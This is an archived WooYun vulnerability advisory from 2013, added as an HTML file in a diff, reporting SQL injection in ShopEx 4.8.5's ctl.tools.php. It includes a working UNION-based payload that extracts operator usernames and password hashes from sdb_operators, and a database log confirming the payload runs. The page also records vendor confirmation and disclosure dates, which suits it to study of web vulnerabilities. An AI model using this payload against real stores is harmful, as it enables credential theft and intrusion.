@@ -1,0 +1,195 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		shopex注入漏洞#1  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		shopex注入漏洞#1  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Code_Sec">Code_Sec</a> 
+</li><li>提交时间：		2013-05-26 20:32</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-29：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-15：	细节向普通白帽子公开<br/>
+									2013-07-05：	细节向实习白帽子公开<br/>
+									2013-08-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">又是sql注入<br />
+测试版本：shopex-singel-4.8.5.78660</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">文件\core\shop\controller\ctl.tools.php<br />
+<br />
+</p><pre><code>function products(){<br />
+        $objGoods  = &amp;$this-&gt;system-&gt;loadModel(&#039;goods/products&#039;);<br />
+<br />
+        $filter = array();<br />
+        foreach(explode(&#039;,&#039;,$_POST[&#039;goods&#039;]) as $gid){<br />
+            $filter[&#039;goods_id&#039;][] = $gid;<br />
+         }<br />
+<br />
+        $this-&gt;pagedata[&#039;products&#039;] = $objGoods-&gt;getList($objGoods-&gt;defaultCols.&#039;,find_in_set(goods_id,&quot;&#039;.$_POST[&#039;goods&#039;].&#039;&quot;) as rank&#039;,$filter,0,-1,array(&#039;rank&#039;,&#039;asc&#039;));</code></pre><p class='detail'><br />
+<br />
+目测$_POST[&#039;goods&#039;]直接进入到sql语句中，由于部分文件加密开启sql语句执行记录日志<br />
+<br />
+提交：<br />
+<br />
+goods=aaa&quot;) FROM sdb_goods union select 1,concat(username,userpass),3,4,5,6,7,8,9,10,11,12,13 from sdb_operators%23<br />
+<br />
+</p><pre><code>130526 20:03:23	  352 Connect	root@localhost on <br />
+		  352 Init DB	shopex<br />
+		  352 Query	SET NAMES &#039;utf8&#039;<br />
+		  352 Query	SELECT * FROM sdb_plugins WHERE plugin_type=&quot;app&quot;<br />
+		  352 Query	select * from sdb_plugins where plugin_type=&quot;app&quot; and plugin_ident=&#039;commodity_radar&#039; LIMIT 0, 1<br />
+		  352 Query	select * from sdb_plugins where plugin_type=&quot;app&quot; and plugin_ident=&#039;shopex_stat&#039; LIMIT 0, 1<br />
+		  352 Query	SELECT count(goods_id) FROM sdb_goods WHERE goods_id IN (0,0,0,3,4,5,6,7,8,9,10,11,12,13) AND sdb_goods.disabled = &#039;false&#039; AND sdb_goods.goods_type=&#039;normal&#039; ORDER BY rank asc<br />
+		  352 Query	SELECT bn,name,cat_id,price,store,marketable,brand_id,weight,d_order,uptime,type_id,supplier_id,find_in_set(goods_id,&quot;aaa&quot;) FROM sdb_goods union select 1,concat(username,userpass),3,4,5,6,7,8,9,10,11,12,13 from sdb_operators#&quot;) as rank,goods_id,image_default,thumbnail_pic,brief,pdt_desc,mktprice,big_pic FROM sdb_goods WHERE goods_id IN (0,0,0,3,4,5,6,7,8,9,10,11,12,13) AND sdb_goods.disabled = &#039;false&#039; AND sdb_goods.goods_type=&#039;normal&#039; ORDER BY rank asc LIMIT 0, 18446744073709551615</code></pre><p class='detail'><br />
+<br />
+查看日志变量已经进入到sql语句中 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/262007124244fe64fd9eca75d80e408d88e49424.jpg" target="_blank"><img src="../images/262007124244fe64fd9eca75d80e408d88e49424.jpg" alt="2013-05-25_143659.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Code_Sec" title="Code_Sec">Code_Sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024553" title="shopex注入漏洞#1">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-05-26 23:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24553";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
